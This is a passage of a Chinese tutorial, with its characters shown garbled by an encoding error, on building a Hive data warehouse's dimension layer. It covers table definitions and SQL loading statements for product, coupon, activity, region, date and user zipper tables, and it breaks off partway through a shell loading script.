æ•°ä»“å¼€å‘ä¹‹DIMå±‚</h2><p>DIMå±‚è®¾è®¡è¦ç‚¹ï¼š</p><p>1ï¼‰DIMå±‚çš„è®¾è®¡ä¾æ®æ˜¯ç»´åº¦å»ºæ¨¡ç†è®ºï¼Œè¯¥å±‚å­˜å‚¨ç»´åº¦æ¨¡å‹çš„ç»´åº¦è¡¨ã€‚</p><p>2ï¼‰DIMå±‚çš„æ•°æ®å­˜å‚¨æ ¼å¼ä¸ºorcåˆ—å¼å­˜å‚¨+snappyå‹ç¼©ã€‚</p><p>3ï¼‰DIMå±‚è¡¨åçš„å‘½åè§„èŒƒä¸ºdim_è¡¨å_å…¨é‡è¡¨æˆ–è€…æ‹‰é“¾è¡¨æ ‡è¯†ï¼ˆfull/zipï¼‰</p><h3 id="å•†å“ç»´åº¦è¡¨"><a href="#å•†å“ç»´åº¦è¡¨" class="headerlink" title="å•†å“ç»´åº¦è¡¨"></a>å•†å“ç»´åº¦è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dim_sku_full;</p><p>CREATE EXTERNAL TABLE dim_sku_full</p><p>(</p><p>`id` STRING COMMENT â€˜sku_idâ€™,</p><p>`price` DECIMAL(16, 2) COMMENT â€˜å•†å“ä»·æ ¼â€™,</p><p>`sku_name` STRING COMMENT â€˜å•†å“åç§°â€™,</p><p>`sku_desc` STRING COMMENT â€˜å•†å“æè¿°â€™,</p><p>`weight` DECIMAL(16, 2) COMMENT â€˜é‡é‡â€™,</p><p>`is_sale` BOOLEAN COMMENT â€˜æ˜¯å¦åœ¨å”®â€™,</p><p>`spu_id` STRING COMMENT â€˜spuç¼–å·â€™,</p><p>`spu_name` STRING COMMENT â€˜spuåç§°â€™,</p><p>`category3_id` STRING COMMENT â€˜ä¸‰çº§åˆ†ç±»idâ€™,</p><p>`category3_name` STRING COMMENT â€˜ä¸‰çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` STRING COMMENT â€˜äºŒçº§åˆ†ç±»idâ€™,</p><p>`category2_name` STRING COMMENT â€˜äºŒçº§åˆ†ç±»åç§°â€™,</p><p>`category1_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category1_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰Œidâ€™,</p><p>`tm_name` STRING COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`sku_attr_values` ARRAY&lt;STRUCT&lt;attr_id :STRING,value_id :STRING,attr_name<br>:STRING,value_name:STRING&gt;&gt; COMMENT â€˜å¹³å°å±æ€§â€™,</p><p>`sku_sale_attr_values` ARRAY&lt;STRUCT&lt;sale_attr_id :STRING,sale_attr_value_id<br>:STRING,sale_attr_name :STRING,sale_attr_value_name:STRING&gt;&gt; COMMENT<br>â€˜é”€å”®å±æ€§â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¶é—´â€™</p><p>) COMMENT â€˜å•†å“ç»´åº¦è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dim/dim_sku_full/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>with</p><p>sku as</p><p>(</p><p>select</p><p>id,</p><p>price,</p><p>sku_name,</p><p>sku_desc,</p><p>weight,</p><p>is_sale,</p><p>spu_id,</p><p>category3_id,</p><p>tm_id,</p><p>create_time</p><p>from ods_sku_info_full</p><p>where dt=â€™2020-06-14â€™</p><p>),</p><p>spu as</p><p>(</p><p>select</p><p>id,</p><p>spu_name</p><p>from ods_spu_info_full</p><p>where dt=â€™2020-06-14â€™</p><p>),</p><p>c3 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category2_id</p><p>from ods_base_category3_full</p><p>where dt=â€™2020-06-14â€™</p><p>),</p><p>c2 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category1_id</p><p>from ods_base_category2_full</p><p>where dt=â€™2020-06-14â€™</p><p>),</p><p>c1 as</p><p>(</p><p>select</p><p>id,</p><p>name</p><p>from ods_base_category1_full</p><p>where dt=â€™2020-06-14â€™</p><p>),</p><p>tm as</p><p>(</p><p>select</p><p>id,</p><p>tm_name</p><p>from ods_base_trademark_full</p><p>where dt=â€™2020-06-14â€™</p><p>),</p><p>attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(â€˜attr_idâ€™,attr_id,â€™value_idâ€™,value_id,â€™attr_nameâ€™,attr_name,â€™value_nameâ€™,value_name))<br>attrs</p><p>from ods_sku_attr_value_full</p><p>where dt=â€™2020-06-14â€™</p><p>group by sku_id</p><p>),</p><p>sale_attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(â€˜sale_attr_idâ€™,sale_attr_id,â€™sale_attr_value_idâ€™,sale_attr_value_id,â€™sale_attr_nameâ€™,sale_attr_name,â€™sale_attr_value_nameâ€™,sale_attr_value_name))<br>sale_attrs</p><p>from ods_sku_sale_attr_value_full</p><p>where dt=â€™2020-06-14â€™</p><p>group by sku_id</p><p>)</p><p>insert overwrite table dim_sku_full partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>sku.id,</p><p>sku.price,</p><p>sku.sku_name,</p><p>sku.sku_desc,</p><p>sku.weight,</p><p>sku.is_sale,</p><p>sku.spu_id,</p><p>spu.spu_name,</p><p>sku.category3_id,</p><p>c3.name,</p><p>c3.category2_id,</p><p>c2.name,</p><p>c2.category1_id,</p><p>c1.name,</p><p>sku.tm_id,</p><p>tm.tm_name,</p><p>attr.attrs,</p><p>sale_attr.sale_attrs,</p><p>sku.create_time</p><p>from sku</p><p>left join spu on sku.spu_id=spu.id</p><p>left join c3 on sku.category3_id=c3.id</p><p>left join c2 on c3.category2_id=c2.id</p><p>left join c1 on c2.category1_id=c1.id</p><p>left join tm on sku.tm_id=tm.id</p><p>left join attr on sku.id=attr.sku_id</p><p>left join sale_attr on sku.id=sale_attr.sku_id;</p><h3 id="ä¼˜æƒ åˆ¸ç»´åº¦è¡¨"><a href="#ä¼˜æƒ åˆ¸ç»´åº¦è¡¨" class="headerlink" title="ä¼˜æƒ åˆ¸ç»´åº¦è¡¨"></a>ä¼˜æƒ åˆ¸ç»´åº¦è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dim_coupon_full;</p><p>CREATE EXTERNAL TABLE dim_coupon_full</p><p>(</p><p>`id` STRING COMMENT â€˜è´­ç‰©åˆ¸ç¼–å·â€™,</p><p>`coupon_name` STRING COMMENT â€˜è´­ç‰©åˆ¸åç§°â€™,</p><p>`coupon_type_code` STRING COMMENT â€˜è´­ç‰©åˆ¸ç±»å‹ç¼–ç â€™,</p><p>`coupon_type_name` STRING COMMENT â€˜è´­ç‰©åˆ¸ç±»å‹åç§°â€™,</p><p>`condition_amount` DECIMAL(16, 2) COMMENT â€˜æ»¡é¢æ•°â€™,</p><p>`condition_num` BIGINT COMMENT â€˜æ»¡ä»¶æ•°â€™,</p><p>`activity_id` STRING COMMENT â€˜æ´»åŠ¨ç¼–å·â€™,</p><p>`benefit_amount` DECIMAL(16, 2) COMMENT â€˜å‡é‡‘é¢â€™,</p><p>`benefit_discount` DECIMAL(16, 2) COMMENT â€˜æŠ˜æ‰£â€™,</p><p>`benefit_rule` STRING COMMENT â€˜ä¼˜æƒ è§„åˆ™:æ»¡å…ƒ*å‡*å…ƒï¼Œæ»¡*ä»¶æ‰“*æŠ˜â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¶é—´â€™,</p><p>`range_type_code` STRING COMMENT â€˜ä¼˜æƒ èŒƒå›´ç±»å‹ç¼–ç â€™,</p><p>`range_type_name` STRING COMMENT â€˜ä¼˜æƒ èŒƒå›´ç±»å‹åç§°â€™,</p><p>`limit_num` BIGINT COMMENT â€˜æœ€å¤šé¢†å–æ¬¡æ•°â€™,</p><p>`taken_count` BIGINT COMMENT â€˜å·²é¢†å–æ¬¡æ•°â€™,</p><p>`start_time` STRING COMMENT â€˜å¯ä»¥é¢†å–çš„å¼€å§‹æ—¥æœŸâ€™,</p><p>`end_time` STRING COMMENT â€˜å¯ä»¥é¢†å–çš„ç»“æŸæ—¥æœŸâ€™,</p><p>`operate_time` STRING COMMENT â€˜ä¿®æ”¹æ—¶é—´â€™,</p><p>`expire_time` STRING COMMENT â€˜è¿‡æœŸæ—¶é—´â€™</p><p>) COMMENT â€˜ä¼˜æƒ åˆ¸ç»´åº¦è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dim/dim_coupon_full/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dim_coupon_full partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>coupon_dic.dic_name,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case coupon_type</p><p>when â€˜3201â€™ then concat(â€˜æ»¡â€™,condition_amount,â€™å…ƒå‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>when â€˜3202â€™ then concat(â€˜æ»¡â€™,condition_num,â€™ä»¶æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>when â€˜3203â€™ then concat(â€˜å‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>end benefit_rule,</p><p>create_time,</p><p>range_type,</p><p>range_dic.dic_name,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>create_time,</p><p>range_type,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from ods_coupon_info_full</p><p>where dt=â€™2020-06-14â€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™32â€™</p><p>)coupon_dic</p><p>on ci.coupon_type=coupon_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™33â€™</p><p>)range_dic</p><p>on ci.range_type=range_dic.dic_code;</p><h3 id="æ´»åŠ¨ç»´åº¦è¡¨"><a href="#æ´»åŠ¨ç»´åº¦è¡¨" class="headerlink" title="æ´»åŠ¨ç»´åº¦è¡¨"></a>æ´»åŠ¨ç»´åº¦è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dim_activity_full;</p><p>CREATE EXTERNAL TABLE dim_activity_full</p><p>(</p><p>`activity_rule_id` STRING COMMENT â€˜æ´»åŠ¨è§„åˆ™IDâ€™,</p><p>`activity_id` STRING COMMENT â€˜æ´»åŠ¨IDâ€™,</p><p>`activity_name` STRING COMMENT â€˜æ´»åŠ¨åç§°â€™,</p><p>`activity_type_code` STRING COMMENT â€˜æ´»åŠ¨ç±»å‹ç¼–ç â€™,</p><p>`activity_type_name` STRING COMMENT â€˜æ´»åŠ¨ç±»å‹åç§°â€™,</p><p>`activity_desc` STRING COMMENT â€˜æ´»åŠ¨æè¿°â€™,</p><p>`start_time` STRING COMMENT â€˜å¼€å§‹æ—¶é—´â€™,</p><p>`end_time` STRING COMMENT â€˜ç»“æŸæ—¶é—´â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¶é—´â€™,</p><p>`condition_amount` DECIMAL(16, 2) COMMENT â€˜æ»¡å‡é‡‘é¢â€™,</p><p>`condition_num` BIGINT COMMENT â€˜æ»¡å‡ä»¶æ•°â€™,</p><p>`benefit_amount` DECIMAL(16, 2) COMMENT â€˜ä¼˜æƒ é‡‘é¢â€™,</p><p>`benefit_discount` DECIMAL(16, 2) COMMENT â€˜ä¼˜æƒ æŠ˜æ‰£â€™,</p><p>`benefit_rule` STRING COMMENT â€˜ä¼˜æƒ è§„åˆ™â€™,</p><p>`benefit_level` STRING COMMENT â€˜ä¼˜æƒ çº§åˆ«â€™</p><p>) COMMENT â€˜æ´»åŠ¨ä¿¡æ¯è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dim/dim_activity_full/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dim_activity_full partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>rule.id,</p><p>info.id,</p><p>activity_name,</p><p>rule.activity_type,</p><p>dic.dic_name,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case rule.activity_type</p><p>when â€˜3101â€™ then concat(â€˜æ»¡â€™,condition_amount,â€™å…ƒå‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>when â€˜3102â€™ then concat(â€˜æ»¡â€™,condition_num,â€™ä»¶æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>when â€˜3103â€™ then concat(â€˜æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>end benefit_rule,</p><p>benefit_level</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>activity_id,</p><p>activity_type,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>benefit_level</p><p>from ods_activity_rule_full</p><p>where dt=â€™2020-06-14â€™</p><p>)rule</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>activity_name,</p><p>activity_type,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time</p><p>from ods_activity_info_full</p><p>where dt=â€™2020-06-14â€™</p><p>)info</p><p>on rule.activity_id=info.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™31â€™</p><p>)dic</p><p>on rule.activity_type=dic.dic_code;</p><h3 id="åœ°åŒºç»´åº¦è¡¨"><a href="#åœ°åŒºç»´åº¦è¡¨" class="headerlink" title="åœ°åŒºç»´åº¦è¡¨"></a>åœ°åŒºç»´åº¦è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dim_province_full;</p><p>CREATE EXTERNAL TABLE dim_province_full</p><p>(</p><p>`id` STRING COMMENT â€˜idâ€™,</p><p>`province_name` STRING COMMENT â€˜çœå¸‚åç§°â€™,</p><p>`area_code` STRING COMMENT â€˜åœ°åŒºç¼–ç â€™,</p><p>`iso_code` STRING COMMENT â€˜æ—§ç‰ˆISO-3166-2ç¼–ç ï¼Œä¾›å¯è§†åŒ–ä½¿ç”¨â€™,</p><p>`iso_3166_2` STRING COMMENT â€˜æ–°ç‰ˆIOS-3166-2ç¼–ç ï¼Œä¾›å¯è§†åŒ–ä½¿ç”¨â€™,</p><p>`region_id` STRING COMMENT â€˜åœ°åŒºidâ€™,</p><p>`region_name` STRING COMMENT â€˜åœ°åŒºåç§°â€™</p><p>) COMMENT â€˜åœ°åŒºç»´åº¦è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dim/dim_province_full/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dim_province_full partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>province.id,</p><p>province.name,</p><p>province.area_code,</p><p>province.iso_code,</p><p>province.iso_3166_2,</p><p>region_id,</p><p>region_name</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>region_id,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)province</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>region_name</p><p>from ods_base_region_full</p><p>where dt=â€™2020-06-14â€™</p><p>)region</p><p>on province.region_id=region.id;</p><h3 id="æ—¥æœŸç»´åº¦è¡¨"><a href="#æ—¥æœŸç»´åº¦è¡¨" class="headerlink" title="æ—¥æœŸç»´åº¦è¡¨"></a>æ—¥æœŸç»´åº¦è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dim_date;</p><p>CREATE EXTERNAL TABLE dim_date</p><p>(</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`week_id` STRING COMMENT â€˜å‘¨ID,ä¸€å¹´ä¸­çš„ç¬¬å‡ å‘¨â€™,</p><p>`week_day` STRING COMMENT â€˜å‘¨å‡ â€™,</p><p>`day` STRING COMMENT â€˜æ¯æœˆçš„ç¬¬å‡ å¤©â€™,</p><p>`month` STRING COMMENT â€˜ä¸€å¹´ä¸­çš„ç¬¬å‡ æœˆâ€™,</p><p>`quarter` STRING COMMENT â€˜ä¸€å¹´ä¸­çš„ç¬¬å‡ å­£åº¦â€™,</p><p>`year` STRING COMMENT â€˜å¹´ä»½â€™,</p><p>`is_workday` STRING COMMENT â€˜æ˜¯å¦æ˜¯å·¥ä½œæ—¥â€™,</p><p>`holiday_id` STRING COMMENT â€˜èŠ‚å‡æ—¥â€™</p><p>) COMMENT â€˜æ—¶é—´ç»´åº¦è¡¨â€™</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dim/dim_date/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæ—¶é—´ç»´åº¦è¡¨çš„æ•°æ®å¹¶ä¸æ˜¯æ¥è‡ªäºä¸šåŠ¡ç³»ç»Ÿï¼Œè€Œæ˜¯æ‰‹åŠ¨å†™å…¥ï¼Œå¹¶ä¸”ç”±äºæ—¶é—´ç»´åº¦è¡¨æ•°æ®çš„å¯é¢„è§æ€§ï¼Œæ— é¡»æ¯æ—¥å¯¼å…¥ï¼Œä¸€èˆ¬å¯ä¸€æ¬¡æ€§å¯¼å…¥ä¸€å¹´çš„æ•°æ®ã€‚</p><p>ï¼ˆ1ï¼‰åˆ›å»ºä¸´æ—¶è¡¨</p><p>DROP TABLE IF EXISTS tmp_dim_date_info;</p><p>CREATE EXTERNAL TABLE tmp_dim_date_info (</p><p>`date_id` STRING COMMENT â€˜æ—¥â€™,</p><p>`week_id` STRING COMMENT â€˜å‘¨IDâ€™,</p><p>`week_day` STRING COMMENT â€˜å‘¨å‡ â€™,</p><p>`day` STRING COMMENT â€˜æ¯æœˆçš„ç¬¬å‡ å¤©â€™,</p><p>`month` STRING COMMENT â€˜ç¬¬å‡ æœˆâ€™,</p><p>`quarter` STRING COMMENT â€˜ç¬¬å‡ å­£åº¦â€™,</p><p>`year` STRING COMMENT â€˜å¹´â€™,</p><p>`is_workday` STRING COMMENT â€˜æ˜¯å¦æ˜¯å·¥ä½œæ—¥â€™,</p><p>`holiday_id` STRING COMMENT â€˜èŠ‚å‡æ—¥â€™</p><p>) COMMENT â€˜æ—¶é—´ç»´åº¦è¡¨â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/tmp/tmp_dim_date_info/â€˜;</p><p>ï¼ˆ2ï¼‰å°†æ•°æ®æ–‡ä»¶ä¸Šä¼ åˆ°HFDSä¸Šä¸´æ—¶è¡¨è·¯å¾„/warehouse/gmall/tmp/tmp_dim_date_info</p><p>ï¼ˆ3ï¼‰æ‰§è¡Œä»¥ä¸‹è¯­å¥å°†å…¶å¯¼å…¥æ—¶é—´ç»´åº¦è¡¨</p><p>insert overwrite table dim_date select * from tmp_dim_date_info;</p><p>ï¼ˆ4ï¼‰æ£€æŸ¥æ•°æ®æ˜¯å¦å¯¼å…¥æˆåŠŸ</p><p>select * from dim_date;</p><h3 id="ç”¨æˆ·ç»´åº¦è¡¨"><a href="#ç”¨æˆ·ç»´åº¦è¡¨" class="headerlink" title="ç”¨æˆ·ç»´åº¦è¡¨"></a>ç”¨æˆ·ç»´åº¦è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dim_user_zip;</p><p>CREATE EXTERNAL TABLE dim_user_zip</p><p>(</p><p>`id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`login_name` STRING COMMENT â€˜ç”¨æˆ·åç§°â€™,</p><p>`nick_name` STRING COMMENT â€˜ç”¨æˆ·æ˜µç§°â€™,</p><p>`name` STRING COMMENT â€˜ç”¨æˆ·å§“åâ€™,</p><p>`phone_num` STRING COMMENT â€˜æ‰‹æœºå·ç â€™,</p><p>`email` STRING COMMENT â€˜é‚®ç®±â€™,</p><p>`user_level` STRING COMMENT â€˜ç”¨æˆ·ç­‰çº§â€™,</p><p>`birthday` STRING COMMENT â€˜ç”Ÿæ—¥â€™,</p><p>`gender` STRING COMMENT â€˜æ€§åˆ«â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¶é—´â€™,</p><p>`operate_time` STRING COMMENT â€˜æ“ä½œæ—¶é—´â€™,</p><p>`start_date` STRING COMMENT â€˜å¼€å§‹æ—¥æœŸâ€™,</p><p>`end_date` STRING COMMENT â€˜ç»“æŸæ—¥æœŸâ€™</p><p>) COMMENT â€˜ç”¨æˆ·è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dim/dim_user_zip/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰åˆ†åŒºè§„åˆ’</strong></p><p><strong>3ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰æ•°æ®è£…è½½è¿‡ç¨‹</strong></p><p><strong>ï¼ˆ2ï¼‰æ•°æ®æµå‘</strong></p><p><strong>ï¼ˆ3ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dim_user_zip partition (dt=â€™9999-12-31â€™)</p><p>select</p><p>data.id,</p><p>data.login_name,</p><p>data.nick_name,</p><p>md5(data.name),</p><p>md5(data.phone_num),</p><p>md5(data.email),</p><p>data.user_level,</p><p>data.birthday,</p><p>data.gender,</p><p>data.create_time,</p><p>data.operate_time,</p><p>â€˜2020-06-14â€™ start_date,</p><p>â€˜9999-12-31â€™ end_date</p><p>from ods_user_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™;</p><p><strong>ï¼ˆ4ï¼‰æ¯æ—¥è£…è½½</strong></p><p><strong>è£…è½½æ€è·¯</strong></p><p><strong>è£…è½½è¯­å¥</strong></p><p>with</p><p>tmp as</p><p>(</p><p>select</p><p>old.id old_id,</p><p>old.login_name old_login_name,</p><p>old.nick_name old_nick_name,</p><p>old.name old_name,</p><p>old.phone_num old_phone_num,</p><p>old.email old_email,</p><p>old.user_level old_user_level,</p><p>old.birthday old_birthday,</p><p>old.gender old_gender,</p><p>old.create_time old_create_time,</p><p>old.operate_time old_operate_time,</p><p>old.start_date old_start_date,</p><p>old.end_date old_end_date,</p><p>new.id new_id,</p><p>new.login_name new_login_name,</p><p>new.nick_name new_nick_name,</p><p>new.name new_name,</p><p>new.phone_num new_phone_num,</p><p>new.email new_email,</p><p>new.user_level new_user_level,</p><p>new.birthday new_birthday,</p><p>new.gender new_gender,</p><p>new.create_time new_create_time,</p><p>new.operate_time new_operate_time,</p><p>new.start_date new_start_date,</p><p>new.end_date new_end_date</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>login_name,</p><p>nick_name,</p><p>name,</p><p>phone_num,</p><p>email,</p><p>user_level,</p><p>birthday,</p><p>gender,</p><p>create_time,</p><p>operate_time,</p><p>start_date,</p><p>end_date</p><p>from dim_user_zip</p><p>where dt=â€™9999-12-31â€™</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>id,</p><p>login_name,</p><p>nick_name,</p><p>md5(name) name,</p><p>md5(phone_num) phone_num,</p><p>md5(email) email,</p><p>user_level,</p><p>birthday,</p><p>gender,</p><p>create_time,</p><p>operate_time,</p><p>â€˜2020-06-15â€™ start_date,</p><p>â€˜9999-12-31â€™ end_date</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.login_name,</p><p>data.nick_name,</p><p>data.name,</p><p>data.phone_num,</p><p>data.email,</p><p>data.user_level,</p><p>data.birthday,</p><p>data.gender,</p><p>data.create_time,</p><p>data.operate_time,</p><p>row_number() over (partition by data.id order by ts desc) rn</p><p>from ods_user_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>)t1</p><p>where rn=1</p><p>)new</p><p>on old.id=new.id</p><p>)</p><p>insert overwrite table dim_user_zip partition(dt)</p><p>select</p><p>if(new_id is not null,new_id,old_id),</p><p>if(new_id is not null,new_login_name,old_login_name),</p><p>if(new_id is not null,new_nick_name,old_nick_name),</p><p>if(new_id is not null,new_name,old_name),</p><p>if(new_id is not null,new_phone_num,old_phone_num),</p><p>if(new_id is not null,new_email,old_email),</p><p>if(new_id is not null,new_user_level,old_user_level),</p><p>if(new_id is not null,new_birthday,old_birthday),</p><p>if(new_id is not null,new_gender,old_gender),</p><p>if(new_id is not null,new_create_time,old_create_time),</p><p>if(new_id is not null,new_operate_time,old_operate_time),</p><p>if(new_id is not null,new_start_date,old_start_date),</p><p>if(new_id is not null,new_end_date,old_end_date),</p><p>if(new_id is not null,new_end_date,old_end_date) dt</p><p>from tmp</p><p>union all</p><p>select</p><p>old_id,</p><p>old_login_name,</p><p>old_nick_name,</p><p>old_name,</p><p>old_phone_num,</p><p>old_email,</p><p>old_user_level,</p><p>old_birthday,</p><p>old_gender,</p><p>old_create_time,</p><p>old_operate_time,</p><p>old_start_date,</p><p>cast(date_add(â€˜2020-06-15â€™,-1) as string) old_end_date,</p><p>cast(date_add(â€˜2020-06-15â€™,-1) as string) dt</p><p>from tmp</p><p>where old_id is not null</p><p>and new_id is not null;</p><h3 id="æ•°æ®è£…è½½è„šæœ¬-1"><a href="#æ•°æ®è£…è½½è„šæœ¬-1" class="headerlink" title="æ•°æ®è£…è½½è„šæœ¬"></a>æ•°æ®è£…è½½è„šæœ¬</h3><h4 id="é¦–æ—¥è£…è½½è„šæœ¬"><a href="#é¦–æ—¥è£…è½½è„šæœ¬" class="headerlink" title="é¦–æ—¥è£…è½½è„šæœ¬"></a>é¦–æ—¥è£…è½½è„šæœ¬</h4><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºods_to_dim_init.sh</p><p>[atguigu@hadoop102 bin]$ vim ods_to_dim_init.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>echo â€œè¯·ä¼ å…¥æ—¥æœŸå‚æ•°â€</p><p>exit</p><p>fi</p><p>dim_user_zip=â€</p><p>insert overwrite table ${APP}.dim_user_zip partition (dt=â€™9999-12-31â€™)</p><p>select</p><p>data.id,</p><p>data.login_name,</p><p>data.nick_name,</p><p>md5(data.name),</p><p>md5(data.phone_num),</p><p>md5(data.email),</p><p>data.user_level,</p><p>data.birthday,</p><p>data.gender,</p><p>data.create_time,</p><p>data.operate_time,</p><p>â€˜$do_dateâ€™ start_date,</p><p>â€˜9999-12-31â€™ end_date</p><p>from ${APP}.ods_user_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™;</p><p>â€œ</p><p>dim_sku_full=â€</p><p>with</p><p>sku as</p><p>(</p><p>select</p><p>id,</p><p>price,</p><p>sku_name,</p><p>sku_desc,</p><p>weight,</p><p>is_sale,</p><p>spu_id,</p><p>category3_id,</p><p>tm_id,</p><p>create_time</p><p>from ${APP}.ods_sku_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>spu as</p><p>(</p><p>select</p><p>id,</p><p>spu_name</p><p>from ${APP}.ods_spu_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>c3 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category2_id</p><p>from ${APP}.ods_base_category3_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>c2 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category1_id</p><p>from ${APP}.ods_base_category2_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>c1 as</p><p>(</p><p>select</p><p>id,</p><p>name</p><p>from ${APP}.ods_base_category1_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>tm 